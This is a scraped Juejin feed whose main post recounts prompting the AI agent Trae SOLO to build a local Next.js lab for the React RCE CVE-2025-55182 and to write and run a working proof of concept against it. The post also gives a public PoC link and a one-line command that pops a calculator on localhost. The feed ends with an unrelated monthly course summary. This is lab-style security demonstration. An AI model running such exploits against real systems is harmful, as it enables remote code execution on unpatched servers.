<li>XR-FRAME 文档: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fframework%2Fxr-frame%2F" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/framework/xr-frame/" ref="nofollow noopener noreferrer">developers.weixin.qq.com/miniprogram…</a></li>
<li>VKSession 文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fapi%2Fai%2Fvisionkit%2FVKSession.html" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/api/ai/visionkit/VKSession.html" ref="nofollow noopener noreferrer">developers.weixin.qq.com/miniprogram…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[让Trae SOLO全自主学习开发近期爆出的React RCE漏洞靶场并自主利用验证（CVE-2025-55182）]]></title>    <link>https://juejin.cn/post/7580295137394720783</link>    <guid>https://juejin.cn/post/7580295137394720783</guid>    <pubDate>2025-12-06T12:14:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580295137394720783" data-draft-id="7580278296837586978" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="让Trae SOLO全自主学习开发近期爆出的React RCE漏洞靶场并自主利用验证（CVE-2025-55182）"/> <meta itemprop="keywords" content="安全,前端,人工智能"/> <meta itemprop="datePublished" content="2025-12-06T12:14:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="银空飞羽"/> <meta itemprop="url" content="https://juejin.cn/user/1086796427178429"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            让Trae SOLO全自主学习开发近期爆出的React RCE漏洞靶场并自主利用验证（CVE-2025-55182）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1086796427178429/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    银空飞羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T12:14:40.000Z" title="Sat Dec 06 2025 12:14:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">写在前面</h2>
<p>前两天爆出的CVSS 评分10.0的React 反序列化命令执行漏洞，突发奇想，让Trae SOLO对该漏洞进行自主学习、自主开发、并且自主进行漏洞利用，应该挺有意思。</p>
<h2 data-id="heading-1">CVE-2025-55182</h2>
<p>简单总结一下该漏洞。</p>
<p>React搞了一个React Server Components（RSC）组件模型，支持通过Flight协议（也是为该场景通信设计的协议）进行交互。</p>
<p>在请求数据到达后端路由时（在进入后端逻辑方法之前），服务端会进行反序列化操作，然后基于反序列化的结果会去调用对应的Server Functions（这是一种RPC-over-HTTP的方法调用机制，允许客户端通过HTTP的方式进行RPC调用）执行相应的操作。</p>
<p>而RSC是依赖于<code>react-server-dom-webpack</code>实现的，所以在该包的特定版本中就存在该反序列化漏洞。而Next.js框架作为RSC的最大下游客户，使用漏洞版本的就会被动受到影响。</p>
<p>那么总结一下，只要某个后端服务的路由path使用了漏洞版本的<code>react-server-dom-webpack</code>包去做如下操作：</p>
<ul>
<li>处理Flight请求</li>
<li>反序列化Flight数据</li>
<li>允许客户端触发Server Functions</li>
</ul>
<p>那么就有被攻击的风险，修复方式就是升级版本。</p>
<p>详细的我就不展开了，分析的文章遍地都是，本篇的重点还是在SOLO自动化学习、设计、开发和漏洞利用上。</p>
<h2 data-id="heading-2">SOLO 启动</h2>
<p>首先给它描述需求</p>
<blockquote>
<p>搭建一个CVE-2025-55182漏洞的靶场，不要自己伪造漏洞环境，要使用真实的<code>Next.js</code>的漏洞版本<br/>
并讲解漏洞原理，以及利用思路手段，并实现利用poc，并完成漏洞利用验证</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/164758e6411f479ab56ef9dc7bb70227~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=tGYvxMJaUeSg45DFilUJ7fd%2FtD4%3D" alt="" loading="lazy"/></p>
<p>然后它先去自己网上搜索学习该漏洞，随后自行设计好了方案，看着没啥问题，直接执行</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bfd0a2faeed45ec8bd2e151b65e70e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=c9EkHoqyvsiYKNofeoCMZeFvSds%3D" alt="" loading="lazy"/></p>
<p>在开发的过程中看了一下依赖，<code>next</code>版本<code>15.0.0</code>正好是漏洞版本，没啥问题</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a44e2f41bad442618f2013db147956e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=ws9oTWXReu7h5yN23kUkRz0xTTY%3D" alt="" loading="lazy"/></p>
<p>等待它开发完毕</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aed0a9bb884e497bb9b76c68aebcb0ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=GFqrwMqRxis7r8l5EeMzR6QGEe0%3D" alt="" loading="lazy"/></p>
<p>靶场搭建好了，然后到Trae自主验证漏洞环节时，出问题了</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7e18e6469f342268264980e194ecf5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=cRGZ3HGtcYQiTUTk5O0RwgyFIrs%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a09bc2e30ae54e0c8eee88da73c230d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=cx%2B560RO%2Fq33G6X8Aq8AuJhgt1E%3D" alt="" loading="lazy"/></p>
<p>它所构造的poc是执行文件写入，然后最后并没有成功，最关键的是，这个时候它验证几次没成功之后就结束任务了！</p>
<p>罗马不是一天建成的，也怪我刚刚指令没有强调漏洞验收结果，那就再给它下达新任务</p>
<blockquote>
<p>检查poc和靶场服务是否不符合预期，最终实现poc可成功利用靶场漏洞的目的</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5238f5c5915b4ea29ad7b4cfcb6f72fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=r32sxZR2Yrw8mrZMFVkDU43Yejo%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b8ec12c2605443f8d086e4d377a22be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=R9%2BVO1IWFYo%2FUmQqgvmaDHBa4ck%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fd80710769d4703ac82524a3be32f40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=Lop3QJ5mUrifziecz0KvZYp7Gas%3D" alt="" loading="lazy"/></p>
<p>最终，它成功了，自主编写了poc并完成了靶场漏洞利用</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53136717ec2c46fdbfff59674e8fdfad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=5iW%2BBB4BdP%2FsrDZWQ4VSLZVbmN0%3D" alt="" loading="lazy"/></p>
<p>成功写入了文件</p>
<h2 data-id="heading-3">漏洞验证</h2>
<p>然后我自己再亲自验证一下，随便找了个网上的poc，github地址：</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/msanft</span><span class="hljs-regexp">/CVE-2025-55182/blob</span><span class="hljs-regexp">/main/poc</span>.py
</code></pre>
<p>执行<code>calc</code>命令弹计算器</p>
<pre><code class="hljs language-arduino" lang="arduino">python poc.py http:<span class="hljs-comment">//localhost:3000 calc</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77f2c7f7560d42b68bfe414d281caff9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZO256m66aOe5769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628628&amp;x-signature=yYZ1VJdFyDSLZtJRah2LCMl1F%2F0%3D" alt="" loading="lazy"/> 验证成功！</p>
<p>这个整体项目还是比较简单的，本来想一句话实现的，这下用了两句话，其实可以优化合并一下：</p>
<blockquote>
<p>搭建一个CVE-2025-55182漏洞的靶场，不要自己伪造漏洞环境，要使用真实的Next.js的漏洞版本<br/>
并讲解漏洞原理，以及利用思路手段，并达成poc可成功利用靶场漏洞的目的</p>
</blockquote>
<p>核心还是得把需求说明白，目标说的越详细效果越好，这也算是Trae SOLO一种新的应用思路了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025年11月总结]]></title>    <link>https://juejin.cn/post/7580312375371776040</link>    <guid>https://juejin.cn/post/7580312375371776040</guid>    <pubDate>2025-12-06T12:46:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580312375371776040" data-draft-id="7580285196692930560" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025年11月总结"/> <meta itemprop="keywords" content="AIGC,人工智能"/> <meta itemprop="datePublished" content="2025-12-06T12:46:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="袁庭新"/> <meta itemprop="url" content="https://juejin.cn/user/1207714136735408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025年11月总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1207714136735408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    袁庭新
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T12:46:39.000Z" title="Sat Dec 06 2025 12:46:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是袁庭新。又来给朋友们汇报工作了，现对2025年11月做一个回顾和总结。</p>
<h2 data-id="heading-0">课程研发</h2>
<p>课程《全面掌握LiblibAI在线AI绘画》在11月初终于推上线了，共计24课时，由柳老师主讲。柳老师拥有16年互联网软件研发管理经验，是大模型技术资深应用专家，具备丰富的大模型训练及AI原生应用架构经验；高级信息系统项目管理师、Oracle认证大师、人工智能治理专家认证（CAIGP）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d396192127f2494f932c471f9b2e1369~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=9ddxUNF4S2dGIY5nj%2F4BEqlT7Yg%3D" alt="" loading="lazy"/></p>
<p>课程《AI+美客多跨境电商实战》在11月初完成40节精品视频录制，加上10月份研发的11节，共计58节课程。现也完成研发并上线了。主讲老师黄老师，是资深的美客多跨境电商高级运营师，拥有四年专注于美客多平台的实战经验，曾独立管理并成功运营20余家美客多跨境店铺，袁庭新老师主要负责教研。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e291165d93554660b36d478c185bfa7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=Y%2F6mRV2jnwwd5xN7xrxY2lf2ZkU%3D" alt="" loading="lazy"/></p>
<p>我讲过很多课，都是关于Java软件开发、AI前沿技术等领域的。技术的迭代速速太快，以至于三年前我讲的内容，从现在的视角望过去可能已经过时了。一直来，我想讲点不变的东西，同时我认为在这个时代每个个体都应该去思考如何创业？所以，《微信商业生态平民创业》这门课程应运而生了。</p>
<p>11月份，《微信商业生态平民创业》完成11节课程录制，现总计录制了20节，计划是24节课程。其实，这门课程我已经准备了两年，也是我最想推荐给大家我的一门课程，甚至我自己都有些兴奋，恨不得赶紧完成它。期待，12月中旬和大家见面。</p>
<h2 data-id="heading-1">文章输出</h2>
<p>11月，累计发布原创文章2篇，并同步分享至公众号、稀土掘金、CSDN、知乎、简书和B站等多个平台。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/464e0e1fff9644e5aa53d916ef8915a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=RXRGgyUvOQ8E0ienm%2FlLIxwQxkk%3D" alt="" loading="lazy"/></p>
<p>11月份，在「人人都要学AI」知识星球中，我共发布了2篇主题内容，核心聚焦于人工智能技术应用领域的前沿知识。</p>
